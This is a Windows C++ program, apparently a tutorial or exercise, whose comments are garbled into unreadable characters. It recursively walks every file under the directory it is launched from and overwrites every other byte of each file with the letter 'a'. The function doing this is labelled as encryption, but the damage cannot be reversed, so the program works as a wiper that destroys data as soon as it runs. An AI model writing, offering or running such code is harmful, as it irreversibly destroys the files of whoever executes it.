

/*
www.С�ո�.com

*/




// �ļ�����������.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"

#include <windows.h>

//3 ����
void jiami(char* fileName){
	//1 ���ļ�
	FILE* fp = NULL;
	fp = fopen(fileName, "r+b");//�Զ����ƶ�д��ʽ���ļ�
	if (NULL == fp){
		printf("���ļ�ʧ��!\n");
		return;
	}
	//2 ��ȡ�ļ���С(�ֽ���)
	int len = 0;
	//2.1 �����ļ�����ָ�뵽�ļ�ĩβ
	 //  �ļ� ����  �ļ�β
	fseek(fp, 0, SEEK_END);
	//2.2 ���ļ�����ָ�뵽�ļ�ͷ�ж����ֽڣ��ļ���С��
	len = ftell(fp);
	//2.3 �����ļ�����ָ�뵽�ļ�ͷ
	fseek(fp, 0, SEEK_SET);
	//3 ��һ���ַ�����һ�������ַ�
	char code = 'a';
	for (int i = 0; i < len; i++){
		fwrite(&code, 1, 1, fp);//д��һ���ַ����ļ�����ָ�봦
		fseek(fp, 1, SEEK_CUR);
	}
	//4 �ر��ļ�
	fclose(fp);
}
//2 ��������ļ����Լ�����������ļ�������鿴ĳ�ļ����������ļ�
void travel(char* pathName){
	//�ļ����ļ��ж����ļ�
	//1 ���ļ�������ĵ�һ���ļ�
	//1.1 ��ȷ��Ҫ�ҵ��ļ�������
	WIN32_FIND_DATA findData;
	char fileName[MAX_PATH] = { 0 };
	sprintf(fileName, "%s\\*.*", pathName);
	HANDLE hFile = FindFirstFile(fileName, &findData);
	if (hFile == INVALID_HANDLE_VALUE){
		printf("û���ҵ��ļ�!\n");
		return;
	}
	
	//2 �ж�
	char temp[MAX_PATH];
	int ret = 1;
	while (ret){
		if (findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY){//2.2 �ļ���
			//travel��pathName//�ļ�������
			//�������ļ���
			if (findData.cFileName[0] != '.'){//�ܿ����������ļ���
				//׼�������ļ��е�����
				memset(temp, 0, MAX_PATH);
				sprintf(temp, "%s\\%s", pathName, findData.cFileName);
				printf("�ļ��У�%s\n", temp);
				//Sleep(500);
				travel(temp);
			}
		}
		else{//�ļ�
			//����һ��
			memset(temp, 0, MAX_PATH);
			sprintf(temp, "%s\\%s", pathName, findData.cFileName);
			printf("�ļ���%s\n", temp);
			//����
			jiami(temp);
		}
		ret = FindNextFile(hFile, &findData);
	}	
}

int _tmain(int argc, _TCHAR* argv[])
{
	//1 Ҫ�����ĸ��ļ��У��ҳ��������֡�     
	//buffer : ������  �������ݵ�����
	char currentDirectory[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, currentDirectory);

	printf("��ǰ�����ļ���:%s\n", currentDirectory);
	travel(currentDirectory);
#if 0
	char fileName[MAX_PATH] = { 0 };
	sprintf(fileName, "%s\\1.txt", currentDirectory);
	jiami(fileName);
#endif

	while (1);
	return 0;
}

